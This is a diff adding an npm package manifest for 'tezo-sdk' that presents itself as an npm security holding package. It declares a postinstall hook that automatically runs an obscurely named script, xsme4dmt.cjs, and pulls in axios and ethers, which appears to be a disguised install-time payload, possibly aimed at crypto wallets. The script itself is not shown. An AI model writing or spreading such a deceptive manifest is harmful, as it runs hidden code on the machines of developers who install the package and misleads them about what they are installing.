@@ -1,0 +1,16 @@
+{
+  "name": "tezo-sdk",
+  "version": "0.0.1-security",
+  "description": "security holding package",
+  "repository": "npm/security-holder",
+  "scripts": {
+    "postinstall": "node xsme4dmt.cjs"
+  },
+  "files": [
+    "xsme4dmt.cjs"
+  ],
+  "dependencies": {
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  }
+}
